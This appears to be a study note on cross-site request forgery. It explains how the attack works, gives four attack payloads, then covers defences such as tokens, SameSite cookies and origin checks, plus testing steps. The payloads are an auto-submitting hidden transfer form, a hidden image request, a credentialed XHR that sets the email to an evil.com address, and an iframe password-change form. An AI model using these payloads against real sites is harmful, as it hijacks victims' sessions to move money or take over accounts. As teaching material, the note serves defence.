# CSRF (Cross-Site Request Forgery)

Source: https://app.notion.com/p/2b9fc75cbbd980feb9d1f0bb30a2a606?pvs=204

<b>Cross-Site Request Forgery</b> - Also known as "XSRF", "Sea Surf", or "Session Riding"

## Core Concept

CSRF tricks authenticated users into executing unwanted actions on a web application where they're currently logged in. The attacker doesn't steal data directly - instead, they make the victim's browser send forged requests using the victim's existing session/cookies.

## How It Works

1. Victim is logged into a legitimate site (e.g., bank.com)
2. Victim visits attacker's malicious site while still logged in
3. Malicious site sends request to bank.com using victim's browser
4. Browser automatically includes victim's cookies/session
5. Bank.com processes request as legitimate since it has valid credentials
6. Unwanted action is performed (money transfer, password change, etc.)

## Key Difference from XSS

- <b>XSS</b>: Exploits trust a user has for a website
- <b>CSRF</b>: Exploits trust a website has for a user's browser

## Attack Examples

### 1. <b>Basic Money Transfer Attack</b>

<b>Vulnerable Bank Form:</b>

html

<i><code><!-- Legitimate bank transfer form --></code></i><code>
<form action="https://bank.com/transfer" method="POST">
    To Account: <input name="to_account">
    Amount: <input name="amount">
    <input type="submit" value="Transfer">
</form></code>

<b>Attacker's Malicious Page:</b>

html

<i><code><!-- Hidden form that auto-submits --></code></i><code>
<html>
<body onload="document.forms[0].submit()">
    <form action="https://bank.com/transfer" method="POST">
        <input type="hidden" name="to_account" value="attacker123">
        <input type="hidden" name="amount" value="10000">
    </form>
</body>
</html></code>

### 2. <b>Image Tag GET Request Attack</b>

html

<i><code><!-- Attacker embeds this in any website, email, or forum --></code></i><code>
<img src="https://bank.com/transfer?to=attacker123&amount=10000" 
     width="0" height="0" style="display:none"></code>

### 3. <b>AJAX-Based Attack</b>

javascript

<i><code>// Attacker's JavaScript</code></i><code>
var xhr = new XMLHttpRequest();
xhr.open("POST", "https://victim-site.com/change-email", true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.withCredentials = true;  </code><i><code>// Include cookies</code></i><code>
xhr.send("email=attacker@evil.com");</code>

### 4. <b>Password Change Attack</b>

html

<i><code><!-- Malicious iframe - invisible to user --></code></i><code>
<iframe style="display:none" name="csrf-frame"></iframe>
<form method="POST" action="https://victim.com/change-password" 
      target="csrf-frame" id="csrf-form">
    <input type="hidden" name="new_password" value="hacked123">
    <input type="hidden" name="confirm_password" value="hacked123">
</form>
<script>document.getElementById("csrf-form").submit();</script></code>

## Prevention Methods

### 1. <b>CSRF Tokens (Most Common)</b>

php

<i><code>// Server-side: Generate token</code></i><code>
session_start();
$_SESSION['csrf_token'] = bin2hex(random_bytes(32));

</code><i><code>// Include in forms</code></i><code>
echo '<input type="hidden" name="csrf_token" value="' . $_SESSION['csrf_token'] . '">';

</code><i><code>// Validate on submission</code></i><code>
if ($_POST['csrf_token'] !== $_SESSION['csrf_token']) {
    die("CSRF token validation failed");
}</code>

### 2. <b>Double Submit Cookie</b>

javascript

<i><code>// Set CSRF token as cookie AND form field</code></i><code>
document.cookie = "csrf_token=random123; SameSite=Strict";

</code><i><code>// Include same token in request</code></i><code>
fetch('/api/transfer', {
    method: 'POST',
    headers: {
        'X-CSRF-Token': 'random123'  </code><i><code>// Must match cookie</code></i><code>
    },
    body: formData
});</code>

### 3. <b>SameSite Cookie Attribute</b>

php

<i><code>// Modern approach - prevents cookie from being sent cross-site</code></i><code>
setcookie("session", $value, [
    'samesite' => 'Strict',  </code><i><code>// or 'Lax'</code></i><code>
    'secure' => true,
    'httponly' => true
]);</code>

### 4. <b>Origin/Referer Header Validation</b>

php

<i><code>// Check request origin</code></i><code>
$origin = $_SERVER['HTTP_ORIGIN'] ?? '';
$referer = $_SERVER['HTTP_REFERER'] ?? '';

if (!str_starts_with($origin, 'https://mysite.com') && 
    !str_starts_with($referer, 'https://mysite.com')) {
    die("Invalid request origin");
}</code>

### 5. <b>User Interaction Verification</b>

html

<i><code><!-- Require re-authentication for sensitive actions --></code></i><code>
<form action="/delete-account" method="POST">
    <input type="hidden" name="csrf_token" value="<?= $token ?>">
    Enter your password to confirm: 
    <input type="password" name="confirm_password" required>
    <input type="submit" value="Delete Account">
</form></code>

## Complete Secure Implementation Example

<b>Backend (PHP):</b>

php

<code><?php
class CSRFProtection {
    public static function generateToken() {
        if (!isset($_SESSION['csrf_token'])) {
            $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
        }
        return $_SESSION['csrf_token'];
    }
    
    public static function validateToken($token) {
        if (!isset($_SESSION['csrf_token']) || 
            !hash_equals($_SESSION['csrf_token'], $token)) {
            http_response_code(403);
            die("CSRF validation failed");
        }
        return true;
    }
}

</code><i><code>// Process form</code></i><code>
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    CSRFProtection::validateToken($_POST['csrf_token'] ?? '');
    </code><i><code>// Process the legitimate request</code></i><code>
    processMoneyTransfer($_POST['amount'], $_POST['to_account']);
}
?></code>

<b>Frontend (HTML):</b>

html

<code><form action="/transfer" method="POST">
    <input type="hidden" name="csrf_token" 
           value="<?= CSRFProtection::generateToken() ?>">
    
    To Account: <input name="to_account" required>
    Amount: <input name="amount" type="number" required>
    
    </code><i><code><!-- Additional protection: CAPTCHA for sensitive operations --></code></i><code>
    <div class="g-recaptcha" data-sitekey="your-key"></div>
    
    <input type="submit" value="Transfer Money">
</form></code>

## Testing for CSRF Vulnerabilities

1. <b>Remove CSRF Token</b>: Delete token from request and see if it still works
2. <b>Use Another User's Token</b>: Copy token from different session
3. <b>Change Request Method</b>: Switch from POST to GET
4. <b>Remove Referer Header</b>: Use a proxy to strip headers

## Key Differences Summary

```txt
AspectXSSCSRFExploitsTrust user has for siteTrust site has for userRequires JSYesNo (can use forms/images)Can read responsesYesNoPreventionInput sanitizationCSRF tokens
```

## Remember

- CSRF = "Riding" on someone's authenticated session
- Attacker makes victim's browser do something, not steal data directly
- Always use CSRF tokens for state-changing operations
- GET requests should NEVER modify data (prevents image tag attacks)
- Modern browsers' SameSite cookies provide good default protection

To run code, enable code execution and file creation in Settings > Capabilities.

H

<p />
